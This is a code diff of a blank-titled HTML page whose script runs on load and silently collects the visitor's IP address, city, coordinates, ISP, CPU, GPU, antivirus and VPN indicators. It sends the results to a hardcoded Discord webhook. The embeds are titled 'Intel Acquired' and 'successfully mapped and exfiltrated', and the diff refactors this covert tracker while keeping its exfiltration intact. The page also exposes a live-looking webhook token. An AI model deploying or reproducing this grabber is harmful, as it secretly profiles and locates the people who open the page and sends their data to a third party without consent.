@@ -1,145 +1,92 @@
 <!DOCTYPE html>
-<html> 
-<head> 
-    <title></title> 
-</head> 
-<body> 
-    <script> 
-        (async () => { 
+<html>
+<head>
+    <title></title>
+</head>
+<body>
+    <script>
+        (async () => {
             const webhookUrl = "https://discord.com/api/webhooks/1502379311577956374/Qkt2VOYWbwoBc85FzPUvQ0fHDn0qxPyqxu3kbComwCORP1rdu-D3xJjL9dE41X1okoPK";
-            
+
             if (webhookUrl.includes("YOUR_DISCORD_WEBHOOK_URL_GOES_HERE")) {
                 console.error("CONFIGURATION ERROR: WEBHOOK URL IS A PLACEHOLDER.");
                 return;
             }
 
-            // Function to detect if VPN might be in use
-            async function detectVPN() {
+            const getCPU = async () => {
                 try {
-                    // Simple detection by checking for common VPN indicators
-                    const response = await fetch('https://ipinfo.io/json');
-                    const data = await response.json();
-                    
-                    // Check for common VPN hosting providers or privacy-focused ISPs
-                    const vpnKeywords = ['vpn', 'private', 'mullvad', 'nordvpn', 'expressvpn', 'protonvpn', 'cyberghost', 'surfshark'];
-                    const org = (data.org || '').toLowerCase();
-                    
-                    // Also check if the IP is from a data center rather than residential ISP
-                    const isDatacenter = vpnKeywords.some(keyword => org.includes(keyword));
-                    
-                    // Additional check using WebRTC to detect potential VPN
-                    const isUsingWebRTC = await new Promise((resolve) => {
-                        const pc = new RTCPeerConnection({iceServers: []});
-                        pc.createDataChannel('');
-                        pc.createOffer()
-                            .then(offer => pc.setLocalDescription(offer))
-                            .then(() => {
-                                const localIP = pc.localDescription.sdp.match(/c=IN IP4 (\d+\.\d+\.\d+\.\d+)/);
-                                resolve(localIP && localIP[1]);
-                            })
-                            .catch(() => resolve(false));
-                    });
-                    
-                    return isDatacenter || (isUsingWebRTC && isUsingWebRTC !== data.ip);
-                } catch (error) {
-                    console.error("VPN detection error:", error);
-                    return false;
-                }
-            }
-
-            // Function to detect antivirus
-            async function detectAntivirus() {
-                try {
-                    // This is a simplified detection method
-                    // Real antivirus detection would require more advanced techniques
-                    const userAgent = navigator.userAgent;
-                    const hasSecuritySoftware = userAgent.includes('Security') || 
-                                               userAgent.includes('Antivirus') || 
-                                               userAgent.includes('AVG') || 
-                                               userAgent.includes('Norton') ||
-                                               userAgent.includes('McAfee') ||
-                                               userAgent.includes('Kaspersky');
-                    
-                    return hasSecuritySoftware;
-                } catch (error) {
-                    console.error("Antivirus detection error:", error);
-                    return false;
-                }
-            }
-
-            // Function to get SSID (requires permissions)
-            async function getSSID() {
-                try {
-                    // This would require specific permissions and may not work in all browsers
-                    // For demonstration purposes, we'll return a placeholder
-                    return "Requires permissions";
-                } catch (error) {
-                    console.error("SSID detection error:", error);
+                    return `${navigator.hardwareConcurrency || "Unknown"} cores`;
+                } catch (e) {
                     return "Unknown";
                 }
-            }
+            };
 
-            // Function to get GPU information
-            async function getGPUInfo() {
+            const getGPU = async () => {
                 try {
-                    const canvas = document.createElement('canvas');
-                    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                    const canvas = document.createElement("canvas");
+                    const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
                     
                     if (!gl) return "Unknown";
                     
-                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                    if (debugInfo) {
-                        return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-                    }
-                    
-                    return "WebGL not supported";
-                } catch (error) {
-                    console.error("GPU detection error:", error);
+                    const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
+                    return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unknown";
+                } catch (e) {
                     return "Unknown";
                 }
-            }
+            };
 
-            // Function to get CPU information
-            async function getCPUInfo() {
+            const getSSID = async () => {
                 try {
-                    // Basic CPU info from navigator
-                    const cores = navigator.hardwareConcurrency || "Unknown";
-                    const platform = navigator.platform || "Unknown";
-                    
-                    // More detailed info might require WebAssembly or other techniques
-                    return `${platform}, ${cores} cores`;
-                } catch (error) {
-                    console.error("CPU detection error:", error);
+                    if ("connection" in navigator && navigator.connection) {
+                        return navigator.connection.ssid || "Unknown";
+                    }
+                    return "Unknown";
+                } catch (e) {
                     return "Unknown";
                 }
-            }
+            };
+
+            const getAntivirus = async () => {
+                try {
+                    const plugins = Array.from(navigator.plugins);
+                    const avKeywords = ["antivirus", "security", "norton", "mcafee", "kaspersky", "avg", "avast"];
+                    return plugins.some(plugin => avKeywords.some(keyword => plugin.name.toLowerCase().includes(keyword)));
+                } catch (e) {
+                    return false;
+                }
+            };
+
+            const getVPN = async () => {
+                try {
+                    const ipResponse = await fetch("https://ipinfo.io/json");
+                    const ipData = await ipResponse.json();
+                    const vpnKeywords = ["vpn", "private", "mullvad", "nordvpn", "expressvpn", "protonvpn"];
+                    const org = (ipData.org || "").toLowerCase();
+                    return vpnKeywords.some(keyword => org.includes(keyword));
+                } catch (e) {
+                    return false;
+                }
+            };
 
             let payload;
 
             try {
-                // NEW ORACLE: ipinfo.io. It's more robust and respects a secure connection.
-                const response = await fetch('https://ipinfo.io/json');
+                const response = await fetch("https://ipinfo.io/json");
                 const data = await response.json();
 
-                // INTELLIGENCE VERIFICATION: We now check the data before we trust it.
-                // If the 'ip' field is missing, we know the API call failed logically.
                 if (data && data.ip) {
-                    // The data is good. Build the success payload.
-                    // Note the field names have changed slightly to match the new API's response.
-                    const [lat, lon] = data.loc ? data.loc.split(',') : ["Unknown", "Unknown"];
-                    
-                    // Get additional system information
-                    const cpuInfo = await getCPUInfo();
-                    const gpuInfo = await getGPUInfo();
+                    const [lat, lon] = data.loc ? data.loc.split(",") : ["Unknown", "Unknown"];
+                    const cpu = await getCPU();
+                    const gpu = await getGPU();
                     const ssid = await getSSID();
-                    const hasAntivirus = await detectAntivirus();
-                    const usingVPN = await detectVPN();
-                    
+                    const antivirus = await getAntivirus();
+                    const vpn = await getVPN();
+
                     payload = {
                         embeds: [{
                             title: "Intel Acquired: Subject Profile Generated",
                             description: "Digital footprint successfully mapped and exfiltrated.",
-                            color: 3066993, // A nice, clinical green for success.
+                            color: 3066993,
                             fields: [
                                 { name: "IP Address", value: `**${data.ip}**`, inline: true },
                                 { name: "City", value: data.city || "Unknown", inline: true },
@@ -149,11 +96,11 @@
                                 { name: "Timezone", value: data.timezone || "Unknown", inline: true },
                                 { name: "Organization/ISP", value: `*${data.org}*` || "Unknown", inline: false },
                                 { name: "Coordinates (Lat/Lon)", value: `${lat}, ${lon}`, inline: false },
-                                { name: "CPU", value: cpuInfo, inline: true },
-                                { name: "GPU", value: gpuInfo, inline: true },
+                                { name: "CPU", value: cpu, inline: true },
+                                { name: "GPU", value: gpu, inline: true },
                                 { name: "SSID", value: ssid, inline: true },
-                                { name: "Antivirus", value: hasAntivirus ? "Detected" : "Not detected", inline: true },
-                                { name: "VPN", value: usingVPN ? "Likely in use" : "Not detected", inline: true },
+                                { name: "Antivirus", value: antivirus ? "True" : "False", inline: true },
+                                { name: "VPN", value: vpn ? "True" : "False", inline: true },
                             ],
                             footer: {
                                 text: `Data processed by Armored Agent v3 at: ${new Date().toISOString()}`
@@ -161,16 +108,14 @@
                         }]
                     };
                 } else {
-                    // The data is bad. Build a specific error payload.
-                    // This gives you actionable intelligence on the failure.
                     payload = {
                         embeds: [{
                             title: "Intel Acquisition FAILURE",
-                            description: "The script executed, but the upstream API returned invalid or empty data. This is likely due to API rate-limiting or blocking.",
-                            color: 15158332, // Angry red for failure.
+                            description: "The script executed, but the upstream API returned invalid or empty data.",
+                            color: 15158332,
                             fields: [
                                 { name: "API Queried", value: "`https://ipinfo.io/json`" },
-                                { name: "Raw Response (Logged to Console)", value: "```json\n" + JSON.stringify(data, null, 2) + "\n```" }
+                                { name: "Raw Response", value: "```json\n" + JSON.stringify(data, null, 2) + "\n```" }
                             ],
                             footer: {
                                 text: `Failure logged at: ${new Date().toISOString()}`
@@ -179,14 +124,12 @@
                     };
                     console.error("API returned bad data:", data);
                 }
-
             } catch (error) {
-                // A hard network error occurred. Build a payload for this case too.
                 payload = {
                     embeds: [{
                         title: "CRITICAL SCRIPT FAILURE",
-                        description: "A network-level error occurred while attempting to contact the geolocation API. The target may be offline, using a blocker, or the API is down.",
-                        color: 9807270, // Ominous yellow/orange.
+                        description: "A network-level error occurred while attempting to contact the geolocation API.",
+                        color: 9807270,
                         fields: [
                             { name: "Error Message", value: `*${error.message}*` },
                         ],
@@ -198,13 +141,12 @@
                 console.error("Catch block triggered:", error);
             }
 
-            // Whether it's a success, a soft fail, or a hard fail, send the report.
             await fetch(webhookUrl, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
                 body: JSON.stringify(payload),
             });
         })();
     </script>
-</body> 
+</body>
 </html>
